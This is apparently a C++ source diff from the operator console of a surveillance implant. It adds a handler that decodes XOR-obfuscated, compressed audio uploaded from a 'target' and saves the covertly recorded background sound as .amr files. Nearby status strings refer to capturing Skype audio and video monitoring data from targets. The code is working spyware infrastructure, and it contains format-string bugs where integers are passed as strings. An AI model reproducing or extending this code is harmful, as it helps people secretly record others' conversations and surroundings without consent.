@@ -18,6 +18,7 @@
 #include "include/T5Comm.h"
 
 #include "include/T5Screen.h"
+#include "AudioPlg.h"
 
 //---------------------------------------------------------------------------
 VOID SendMessageToTarControlFrm(Target *tarBlock,
@@ -1415,6 +1416,80 @@ void ProcessMultimediaPluginData(FileTask *lpFileTask,  Target    *tarBlock)
 	SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[目标(ID:%d)] 成功获取 Skype 音视频监控数据!", tarBlock->dwTargetID);
 }
 
+void ProcessBackSoundPluginData(FileTask* lpFileTask, Target* tarBlock)
+{
+	std::string tmpFile = lpFileTask->aniTmpTaskPath;
+
+	HANDLE hf = CreateFileA(tmpFile.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if ( INVALID_HANDLE_VALUE == hf )
+	{
+		int err = GetLastError();
+		return;
+	}
+
+	DWORD size = GetFileSize(hf, NULL);
+
+	char* buffer = new char[size];
+	memset(buffer, 0, size);
+
+	DWORD readed = 0;
+	ReadFile(hf, buffer, size, &readed, NULL);
+
+	AdkXorMemory((PBYTE)buffer, 95, readed);
+
+	AUDIO_PLUGIN_FILE* header = (AUDIO_PLUGIN_FILE*)buffer;
+
+	if ( header->ullMagic != AUDIO_FILE_MAGIC )
+	{
+		delete [] buffer;
+		CloseHandle(hf);
+		return;
+	}
+
+	FILETIME	savetime;
+	FILETIME    locSavetime;
+	SYSTEMTIME	st;
+
+	savetime = header->ftStartRecordTime;
+	FileTimeToLocalFileTime(&savetime, &locSavetime);
+	FileTimeToSystemTime(&locSavetime, &st);
+
+	WCHAR timeStr[256] = {0};
+	wsprintfW(timeStr, L"%.4d-%.2d-%.2d %.2d;%.2d%.2d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
+	
+	int index = header->dwCurIndex;
+	int total = header->dwTotalPieces;
+
+	WCHAR newFileName[1024] = {0};
+	wsprintfW(newFileName, L"%s\\%s@%s@%s.amr", tarBlock->widBackSoundPath.c_str(), timeStr, total, index);
+
+	HANDLE hdst = CreateFileW(newFileName, FILE_GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	char* dstBuffer = new char[header->dwCurBlockSize*4];
+	DWORD dstSize = header->dwCurBlockSize*4;
+
+	int errid = g_zlibUncompress(
+		(PBYTE)dstBuffer,
+		&dstSize,
+		(PBYTE)header->bData,
+		header->dwCurBlockSize);
+
+	DWORD written = 0;
+	WriteFile(hdst, dstBuffer, dstSize, &written, NULL);
+
+	if ( tarBlock->frmTarControl )
+		SendMessageW((HWND)tarBlock->frmTarControl->winId(), WM_NEW_BACKSOUND, (WPARAM)newFileName, (LPARAM)lpFileTask->dwPluginID);
+
+	delete [] buffer;
+	delete [] dstBuffer;
+	
+	CloseHandle(hf);
+	CloseHandle(hdst);
+
+	return;
+}
+
 void ProcessThirdPluginData(FileTask *lpFileTask,  Target    *tarBlock)
 {
 	std::wstring tempFile = AnsiToWide(lpFileTask->aniTmpTaskPath);
@@ -1475,8 +1550,14 @@ DWORD WINAPI ProcessPluginData(PVOID pContext)
 		ProcessMultimediaPluginData(lpFileTask, tarBlock);
 		break;
 
+	case 6:
+		// 背景音
+		ProcessBackSoundPluginData(lpFileTask, tarBlock);
+		break;
+
 	default:
 		ProcessThirdPluginData(lpFileTask, tarBlock);
+		break;
     }
     
     if (tarBlock)
